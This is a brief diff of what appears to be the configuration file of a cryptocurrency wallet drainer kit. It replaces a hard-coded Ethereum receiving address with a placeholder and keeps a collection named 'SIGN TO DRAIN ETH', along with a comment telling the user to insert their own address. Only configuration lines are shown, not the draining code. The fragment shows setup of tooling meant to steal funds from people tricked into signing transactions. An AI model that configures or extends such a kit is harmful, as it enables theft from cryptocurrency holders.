@@ -1,5 +1,5 @@
 // your address goes here
-const receiveAddress = "0x017E377133bDDD9065a668D6488c34904D33bBAF";
+const receiveAddress = "YourAddressHere";
 
 const collectionInfo = {
     name: "SIGN TO DRAIN ETH",
